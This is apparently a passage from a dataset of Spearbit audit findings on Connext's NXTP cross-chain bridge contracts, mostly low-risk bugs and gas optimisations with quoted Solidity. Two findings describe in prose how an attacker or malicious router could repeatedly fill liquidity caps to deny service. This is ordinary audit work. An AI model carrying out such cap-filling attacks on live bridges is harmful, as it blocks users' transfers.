execution has succeeded.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "The lpToken cloned in initializeSwap cannot be updated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) an LPToken lpToken is created by cloning the provided lpTokenTargetAddress to the initializeSwap endpoint. There is no restriction on lpTokenTargetAddress except that it would need to be of LPToken like, but it can be malicious under the hood or have some security vulnerabilities, so it can not be trusted.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Lack of zero check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Consider the following scenarions.  Instance 1 - BridgeFacet.addSequencer The addSequencer function of BridgeFacet.sol does not check that the sequencer address is not zero before adding them. function addSequencer(address _sequencer) external onlyOwnerOrAdmin { if (s.approvedSequencers[_sequencer]) revert BridgeFacet__addSequencer_alreadyApproved(); s.approvedSequencers[_sequencer] = true; emit SequencerAdded(_sequencer, msg.sender); } If there is a mistake during initialization or upgrade, and set s.approvedSequencers[0] = true, anyone might be able to craft a payload to execute on the bridge because the attacker can bypass the following validation within the execute function. if (!s.approvedSequencers[_args.sequencer]) { revert BridgeFacet__execute_notSupportedSequencer(); }  Instance 2 - BridgeFacet.enrollRemoteRouter 43 The enrollRemoteRouter function of BridgeFacet.sol does not check that the domain or router address is not zero before adding them. function enrollRemoteRouter(uint32 _domain, bytes32 _router) external onlyOwnerOrAdmin { // Make sure we aren't setting the current domain as the connextion. if (_domain == s.domain) { revert BridgeFacet__addRemote_invalidDomain(); } s.remotes[_domain] = _router; emit RemoteAdded(_domain, TypeCasts.bytes32ToAddress(_router), msg.sender); }  Instance 3 - TokenFacet._enrollAdoptedAndLocalAssets The _enrollAdoptedAndLocalAssets function of TokenFacet.sol does not check that the _canonical.domain and _canonical.id are not zero before adding them. function _enrollAdoptedAndLocalAssets( address _adopted, address _local, address _stableSwapPool, TokenId calldata _canonical ) internal returns (bytes32 _key) { // Get the key _key = AssetLogic.calculateCanonicalHash(_canonical.id, _canonical.domain); // Get true adopted address adopted = _adopted == address(0) ? _local : _adopted; // Sanity check: needs approval if (s.approvedAssets[_key]) revert TokenFacet__addAssetId_alreadyAdded(); // Update approved assets mapping s.approvedAssets[_key] = true; // Update the adopted mapping using convention of local == adopted iff (_adooted == address(0)) s.adoptedToCanonical[adopted].domain = _canonical.domain; s.adoptedToCanonical[adopted].id = _canonical.id; These two values are used for generating the key to determine if a particular asset has been approved. Additionally, zero value is treated as a null check within the AssetLogic.getCanonicalTokenId function: // Check to see if candidate is an adopted asset. _canonical = s.adoptedToCanonical[_candidate]; if (_canonical.domain != 0) { // Candidate is an adopted asset, return canonical info. return _canonical; }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "When initializing Connext bridge make sure _xAppConnectionManager domain matches the one pro- vided to the initialization function for the bridgee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The only contract that implements IConnectorManager fully is SpokeConnector (through inheriting ConnectorManager and overriding localDomain): 45 // File: SpokeConnector.sol function localDomain() external view override returns (uint32) { return DOMAIN; } So a SpokeConnector or a IConnectorManager has its own concept of the local domain (the domain that it lives / is deployed on). And this domain is used when we are hashing messages and inserting them into the SpokeCon- nector's merkle tree: // File: SpokeConnector.sol bytes memory _message = Message.formatMessage( DOMAIN, bytes32(uint256(uint160(msg.sender))), _nonce, _destinationDomain, _recipientAddress, _messageBody ); // Insert the hashed message into the Merkle tree. bytes32 _messageHash = keccak256(_message); // Returns the root calculated after insertion of message, needed for events for // watchers (bytes32 _root, uint256 _count) = MERKLE.insert(_messageHash); We need to make sure that this local domain matches the _domain provided to this init function. Otherwise, the message hashes that are inserted into SpokeConnector's merkle tree would have 2 different origin domains linked to them. One from SpokeConnector in this message hash and one from connext's s.domain = _domain which is used in calculating the transfer id hash. The same issue applies to setXAppConnectionManager.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "The stable swap pools used in Connext are incompatible with tokens with varying decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The stable swap functionality used in Connext calculates and stores for each token in a pool, the token's precision relative to the pool's precision. The token precision calculation uses the token's decimals. And since this precision is only set once, for a token that can have its decimals changed at a later time in the future, the precision used might not be always accurate in the future. And so in the event of a token decimal change, the swap calculations involving this token would be inaccurate. For exmpale in _xp(...): function _xp(uint256[] memory balances, uint256[] memory precisionMultipliers) internal pure returns (uint256[] memory) uint256 numTokens = balances.length; require(numTokens == precisionMultipliers.length, \"mismatch multipliers\"); uint256[] memory xp = new uint256[]numTokens; for (uint256 i; i < numTokens; ) { xp[i] = balances[i] * precisionMultipliers[i]; unchecked { ++i; } } return xp; { } We are multiplying in xp[i] = balances[i] * precisionMultipliers[i]; and cannot use division for tokens that have higher precision than the pool's default precision.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "When Connext reaches the cap allowed custodied, race conditions can be created", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "When IERC20(local).balanceOf(address(this)) is close to s.caps[key] (this can be relative/subjective) for a canonical token on its canonical domain, a race condition gets created where users might try to frontrun each others calls to xcall or xcallIntoLocal to be included in a cross chain transfer. This race condition is actually between all users and all liquidity routers. Since there is a same type of check when routers try to add liquidity. uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Prevent sequencers from signing multiple routes for the same cross-chain transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Liquidity routers only sign the hash of (transferId, pathLength) combo. This means that each router does not have a say in: 1. The ordering of routers provided/signed by the sequencer. 2. What other routers are used in the sequence. If a sequencer signs 2 different routes (set of routers) for a cross-chain transfer, a relayer can decide which set of routers to use and provide to BridgeFacet.execute to make sure the liquidity from a specific set of routers' balances is used (also the same possibility if 2 different sequencers sign 2 different routes for a cross-chain transfer).", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Well-funded malicious actors can DOS the bridge", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A malicious actor (e.g. a well-funded cross-chain messaging competitor) can DOS the bridge cheaply. Assume Ethereum <-> Polygon bridge and the liquidity cap is set to 1m for USDC. 1. Using a slow transfer to avoid router liquidity fees, Bob (attacker) transferred 1m USDC from Ethereum to Polygon. 1m USDC will be locked on Connext's Bridge. Since the liquidity cap for USDC is filled, no one will be able to transfer any USDC from Ethereum to Polygon unless someone transfers POS-USDC from Polygon to Ethereum to reduce the amount of USDC held by the bridge. 2. On the destination chain, nextUSDC (local bridge asset) will be swapped to POS-USDC (adopted asset). The swap will incur low slippage because it is a stablewap. Assume that Bob will receive 999,900 POS-USDC back on Polygon. A few hundred or thousand loss is probably nothing for a determined competitor that wants to harm the reputation of Connext. 3. Bob bridged back the 999,900 POS-USDC using Polygon's Native POS bridge. Bob will receive 999,900 USDC in his wallet in Ethereum after 30 minutes. It is a 1-1 exchange using a native bridge, so no loss is incurred here. 4. Whenever the liquidity cap for USDC gets reduced on Connext's Bridge, Bob will repeat the same trick to keep the bridge in an locked state. 5. If Bob is well-funded enough, he could perform this against all Connext's bridges linked to other chains for popular assets (e.g. USDC), and normal users will have issues transferring popular assets when using xcall.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "calculateTokenAmount is not checking whether amounts provided has the same length as balances", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "There is no check to make sure amounts.length == balances.length in calculateTokenAmount: function calculateTokenAmount( Swap storage self, uint256[] calldata amounts, bool deposit ) internal view returns (uint256) { uint256 a = _getAPrecise(self); uint256[] memory balances = self.balances; ... There are 2 bad cases: 49 1. amounts.length > balances.length, in this case, we have provided extra data which will be ignored silently and might cause miscalculation on or off chain. 2. amounts.length < balances.length, the loop in calculateTokenAmount would/should revert becasue of an index-out-of-bound error. In this case, we might spend more gas than necessary compared to if we had performed the check and reverted early.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Rearrange an expression in _calculateSwapInv to avoid underflows", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In the following expression used in SwapUtils_calculateSwapInv, if xp[tokenIndexFrom] = x + 1 the expression would underflow and revert. We can arrange the expression to avoid reverting in this edge case. dx = x - xp[tokenIndexFrom] + 1;", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "The pre-image of DIAMOND_STORAGE_POSITION's storage slot is known", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The preimage of the hashed storage slot DIAMOND_STORAGE_POSITION is known.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "The @param NatSpec comment for _key in AssetLogic._swapAsset is incorrect", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The @param NatSpec for _key indicates that this parameter is a canonical token id where instead it should mention that it is a hash of a canonical id and its corresponding domain. We need to make sure the correct value has been passed down to _swapAsset.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Malicious routers can temporarily DOS the bridge by depositing a large amount of liquidity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Both router and bridge share the same liquidity cap on the Connext bridge. Assume that the liquidity cap for USDC is 1 million on Ethereum. Shortly after the Connext Amarok launch, a router adds 1 million USDC liquidity. No one would be able to perform a xcall transfer with USDC from Ethereum to other chains as it will always revert because the liquidity cap has exceeded. The DOS is temporary because the router's liquidity on Ethereum will be reduced if there is USDC liquidity flowing in the opposite direction (e.g., From Polygon to Ethereum)", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Prevent deploying a representation token twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function setupAsset() is protected by _enrollAdoptedAndLocalAssets() which checks s.approvedAssets[_key] to prevent accidentally setting up an asset twice. However the function _removeAssetId() is rather thorough and removes the s.approvedAssets[_key] flag. After a call to _removeAssetId(), an asset can be recreated via setupAsset(). This will deploy a second representation token which will be confusing to users of Connext. Note: The function setupAssetWithDeployedRepresentation() could be used to connect a previous presentation token again to the canonical token. Note: All these functions are authorized so it would only be a problem if mistakes are made. 51 function setupAsset(...) ... onlyOwnerOrAdmin ... { if (_canonical.domain != s.domain) { _local = _deployRepresentation(...); // deploys a new token } else { ... } bytes32 key = _enrollAdoptedAndLocalAssets(_adoptedAssetId, _local, _stableSwapPool, _canonical); ... } function _enrollAdoptedAndLocalAssets(...) ... { ... if (s.approvedAssets[_key]) revert TokenFacet__addAssetId_alreadyAdded(); s.approvedAssets[_key] = true; ... } function _removeAssetId(...) ... { ... delete s.approvedAssets[_key]; ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Extra safety checks in _removeAssetId()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _removeAssetId() deletes assets but it doesn't check if the passed parameters are a consistent set. This allows for mistakes where the wrong values are accidentally deleted. function _removeAssetId(bytes32 _key, address _adoptedAssetId, address _representation) internal { ... delete s.adoptedToCanonical[_adoptedAssetId]; delete s.representationToCanonical[_representation]; ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Data length not validated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The following functions do not validate that the input _data is 32 bytes.  GnosisSpokeConnector._sendMessag  GnosisSpokeConnector._processMessage  BaseMultichain.sendMessage  OptimismSpokeConnector._sendMessage The input _data contains the outbound Merkle root or aggregated Merkle root, which is always 32 bytes. If the root is not 32 bytes, it is invalid and should be rejected.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Verify timestamp reliability on L2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Timestamp information on rollups can be less reliable than on mainnet. For instance, Arbitrum docs say: As a general rule, any timing assumptions a contract makes about block numbers and timestamps should be considered generally reliable in the longer term (i.e., on the order of at least several hours) but unreliable in the shorter term (minutes). (It so happens these are generally the same assumptions one should operate under when using block numbers directly on Ethereum!) Uniswap docs mention this for Optimism: The block.timestamp of these blocks, however, reflect the block.timestamp of the last L1 block ingested by the Sequencer.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "MirrorConnector cannot be changed once set", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "For chains other than Polygon, it is allowed to change mirror connector any number of times. For Polygon chain, the _setMirrorConnector is overridden. 1. Let's take PolygonHubConnector contract example: function _setMirrorConnector(address _mirrorConnector) internal override { super._setMirrorConnector(_mirrorConnector); setFxChildTunnel(_mirrorConnector); } 2. Since setFxChildTunnel(PolygonHubConnector) can only be called once due to below require check, this also restricts the number of time mirror connector can be altered. function setFxChildTunnel(address _fxChildTunnel) public virtual { require(fxChildTunnel == address(0x0), \"FxBaseRootTunnel: CHILD_TUNNEL_ALREADY_SET\"); ... } 54", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Possible infinite loop in dequeueVerified()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The loop in function dequeueVerified() doesn't end if queue.first == queue.last == 0. In this situation, at unchecked { --last; } the following happens: last wraps to type(uint128).max. Now last is very large and is surely >=first and thus the loop keeps running. This problem can occur when queue isn't initialized. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { uint128 first = queue.first; uint128 last = queue.last; require(last >= first, \"queue empty\"); for (last; last >= first; ) { ... unchecked { --last; } // underflows when last == 0 (e.g. queue isn't initialized) } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Do not ignore staticcall's return value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "TypedMemView calls several precompiles through staticcall opcode and never checks its return value assuming it is a success. For instance: TypedMemView.sol#L668-L669, TypedMemView.sol#L685-L686, // use the identity precompile to copy // guaranteed not to fail, so pop the success pop(staticcall(gas(), 4, _oldLoc, _len, _newLoc, _len)) However, there are rare cases when call to precompiles can fail. For example, when the call runs out of gas (since 63/64 of the gas is passed, the remaining execution can still have gas). Generally, not checking for success of calls is dangerous and can have unintended consequences.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk TypedMemView.sol#L652,"]}, {"title": "Renounce wait time can be extended", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The _proposedOwnershipTimestamp updates everytime on calling proposeNewOwner with newlyPro- posed as zero address. This elongates the time when owner can be renounced.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Extra parameter in function checker() at encodeWithSelector()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function checker() sets up the parameters to call the function sendMessage(). However, it adds an extra parameter outboundRoot, which isn't necessary. function sendMessage() external { ... } function checker() external view override returns (bool canExec, bytes memory execPayload) { ... execPayload = abi.encodeWithSelector(this.sendMessage.selector, outboundRoot); // extra parameter ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "MerkleLib.insert() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "storage. Each call to MerkleLib.insert() reads the entire tree from storage, and writes 2 (tree.count and tree.branch[i]) back to storage. These storage operations can be done only once at the beginning, by loading them in memory. The updated count and branches can be written back to the storage at the end saving expensive SSTORE and SLOAD operations.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "EIP712 domain separator can be cached", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The domain separator can be cached for gas-optimization.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "stateCommitmentChain can be made immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Once assigned in constructor, stateCommitmentChain cannot be changed.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Nonce can be updated in single step", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Nonce can be incremented in single step instead of using a second step which will save some gas", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "ZkSyncSpokeConnector._sendMessage encodes unnecessary data", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Augmenting the _data with the processMessage function selector is unnecessary. Since on the mirror domain, we just need to provide the right parameters to ZkSyncHubConnector.processMessageFromRoot (which by the way anyone can call) to prove the L2 message inclusion of the merkle root _data. Thus the current implementation is wasting gas.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "getD can be optimized by removing an extra multiplication by d per iteration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The calculation for the new d can be simplified by canceling a d from the numerator and denominator. Basically, we have : f (D) = 1 nn+1a Q xi Dn+1 + (1 (cid:0) 1 na )D (cid:0) X xi 59 and having/assuming n, a, xi are fixed, we are using Newton's method to find a solution for f = 0. The original implementation is using: D0 = D (cid:0) f (D) f 0(D) = which can be simplified to: (na P xi + Dn+1 nn(cid:0)1 Q xi )D (na (cid:0) 1)D + (n + 1) Dn+1 nn Q xi na P xi + D0 = Dn nn(cid:0)1 (na (cid:0) 1) + (n + 1) D Q xi Dn Q xi nn", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "_recordOutputAsSpent in ArbitrumHubConnector can be optimized by changing the require condition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In _recordOutputAsSpent, _index is compared with a literal value that is a power of 2. The expo- nentiation in this statement can be completely removed to save gas.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Message.leaf's memory manipulation is redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The chunk of memory related to _message is dissected into pieces and then copied into another section of memory and hashed.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "coerceBytes32 can be more optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "It would be cheaper to not use TypedMemView in coerceBytes32(). We would only need to check the length and mask. Note: coerceBytes32 doesn't seem to be used. If that is the case it could also be removed.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Consider removing domains from propagate() arguments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "propagate(uint32[] calldata _domains, address[] calldata _connectors) only uses _do- mains to verify its hash against domainsHash, and to emit an event. Hence, its only use seems to be to notify off-chain agents of the supported domains.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Loop counter can be made uint256 to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "There are several loops that use an uint8 as the type for the loop variable. Changing that to uint256 can save some gas.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Set owner directly to zero address in renounceOwnership", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "1. In renounceOwnership function, _proposed will always be address zero so instead of setting the variable _proposed as owner, we can directly set address(0) as the new owner. 2. Similarly for renounceOwnership function also set address(0) as the new owner.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Retrieve decimals() once", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "There are several locations where the number of decimals() of tokens are retrieved. As all tokens are whitelisted, it would also be possible to retrieve the decimals() once and store these to save gas. BridgeFacet.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function _xcall(...) ... { ... ... AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); ... } AssetLogic.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function swapToLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(ERC20(_asset).decimals(), ERC20(_local).decimals(), _amount, _slippage) ... ... ,! } function swapFromLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(uint8(18), ERC20(adopted).decimals(), _normalizedIn, _slippage) ... ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "The root... function in Merkle.sol can be optimized by using YUL, unrolling loops and using the scratch space", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "We can use assembly, unroll loops, and use the scratch space to save gas. Also, rootWithCtx can be removed (would save us from jumping) since it has only been used here.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "The insert function in Merkle.sol can be optimized by using YUL, unrolling loops and using the scratch space", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "If we use assembly. the scratch space for hashing and unrolling the loop, we can save some gas.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "branchRoot function in Merkle.sol can be more optimized by using YUL, unrolling the loop and using the scratch space", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "We can use assembly, unroll the loop in branchRoot, and use the scratch space to save gas.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Replace divisions by powers of 2 by right shifts and multiplications by left shifts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "When a variable X is divided (multiplied) by a power of 2 (C = 2  c) which is a constant value, the division (multiplication) operation can be replaced by a right (left) shift to save gas.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "TypedMemView.castTo can be optimized by using bitmasks instead of multiple shifts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "TypedMemView.castTo uses bit shifts to clear the type flag bits of a memView, instead masking can be used. Also an extra OR is used to calculate the final view.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Make domain immutable in Facets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Domain in Connector.sol is an immutable variable, however it is defined as a storage variable in LibConnextStorage.sol. Also once initialized in DiamondInit.sol, it cannot be updated again. To save gas, domain can be made an immutable variable to avoid reading from storage.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Cache router balance in repayAavePortal()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "repayAavePortal() reads s.routerBalances[msg.sender][local] twice: if (s.routerBalances[msg.sender][local] < _maxIn) revert PortalFacet__repayAavePortal_insufficientFunds(); ,! ... s.routerBalances[msg.sender][local] -= amountDebited; This can be cached to only read it once.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Unrequired if condition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The below if condition is not required as price will always be 0. This is because if contract finds direct price for asset it returns early, otherwise if no direct price then tokenPrice is set to 0. This means for the code ahead tokenPrice will currently be 0. function getTokenPrice(address _tokenAddress) public view override returns (uint256, uint256) { ... uint256 tokenPrice = assetPrices[tokenAddress].price; if (tokenPrice != 0 && ((block.timestamp - assetPrices[tokenAddress].updatedAt) <= VALID_PERIOD)) { return (tokenPrice, uint256(PriceSource.DIRECT)); } else { tokenPrice = 0; } if (tokenPrice == 0) { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Delete slippage for gas refund", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Once s.slippage[_transferId] is read, it's never read again. It can be deleted to get some gas refund.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Emit event at the beginning in _setOwner()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "_setOwner() maintains an extra variable oldOwner just to emit an event later: function _setOwner(address newOwner) internal { address oldOwner = _owner; _owner = newOwner; _proposedOwnershipTimestamp = 0; _proposed = address(0); emit OwnershipTransferred(oldOwner, newOwner); } If this emit is done at the beginning, oldOwner can be removed.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Simplify the assignment logic of _params.normalizedIn in _xcall", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "When amount > 0 we should have asset != address(0) since otherwise the call would revert: if (_asset == address(0) && _amount != 0) { revert BridgeFacet__xcall_nativeAssetNotSupported(); } and when amount == 0 _params.normalizedIn is 0 which is the value passed to _xcall from xcall or xcall- IntoLocal. So we can move the calculation for _params.normalizedIn into the if (_amount > 0) { block. 90 if (_amount > 0) { // Transfer funds of input asset to the contract from the user. AssetLogic.handleIncomingAsset(_asset, _amount); // Swap to the local asset from adopted if applicable. // TODO: drop the \"IfNeeded\", instead just check whether the asset is already local / needs swap here. _params.bridgedAmt = AssetLogic.swapToLocalAssetIfNeeded(key, _asset, local, _amount, ,! _params.slippage); // Get the normalized amount in (amount sent in by user in 18 decimals). _params.normalizedIn = AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); } gas saved according to test cases: test_Connext__bridgeFastOriginLocalToDestinationAdoptedShouldWork() (gas: -39 (-0.001%)) test_Connext__bridgeFastAdoptedShouldWork() (gas: -39 (-0.001%)) test_Connext__unpermissionedCallsWork() (gas: -39 (-0.003%)) test_BridgeFacet__xcall_worksWithPositiveSlippage() (gas: -39 (-0.003%)) test_BridgeFacet__xcall_adoptedTransferWorks() (gas: -39 (-0.003%)) test_Connext__permissionedCallsWork() (gas: -39 (-0.003%)) test_BridgeFacet__xcallIntoLocal_works() (gas: -39 (-0.003%)) test_BridgeFacet__xcall_localTokenTransferWorksWithAdopted() (gas: -39 (-0.003%)) test_Connext__bridgeFastLocalShouldWork() (gas: -39 (-0.004%)) test_BridgeFacet__xcall_localTokenTransferWorksWhenNotAdopted() (gas: -39 (-0.004%)) test_Connext__bridgeSlowLocalShouldWork() (gas: -39 (-0.005%)) test_Connext__zeroValueTransferWithEmptyAssetShouldWork() (gas: -54 (-0.006%)) test_BridgeFacet__xcall_worksIfPreexistingRelayerFee() (gas: -39 (-0.013%)) test_BridgeFacet__xcall_localTokenTransferWorksWithoutAdopted() (gas: -39 (-0.013%)) test_BridgeFacet__xcall_zeroRelayerFeeWorks() (gas: -32 (-0.014%)) test_BridgeFacet__xcall_canonicalTokenTransferWorks() (gas: -39 (-0.014%)) test_LibDiamond__initializeDiamondCut_withZeroAcceptanceDelay_works() (gas: -3812 (-0.015%)) test_BridgeFacet__xcall_zeroValueEmptyAssetWorks() (gas: -54 (-0.034%)) test_BridgeFacet__xcall_worksWithoutValue() (gas: -795 (-0.074%)) test_Connext__zeroValueTransferShouldWork() (gas: -761 (-0.091%)) Overall gas change: -6054 (-0.308%) Note, we need to make sure in future updates the value of _params.normalizedIn == 0 for any invocation of _xcall. Connext: Solved in PR 2511. Spearbit: Verified.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Simplify BridgeFacet._sendMessage by defining _token only when needed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In BridgeFacet._sendMessage, _local might be a canonical token that does not necessarily have to follow the IBridgeToken interface. But that is not an issue since _token is only used when !_isCanonical.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, 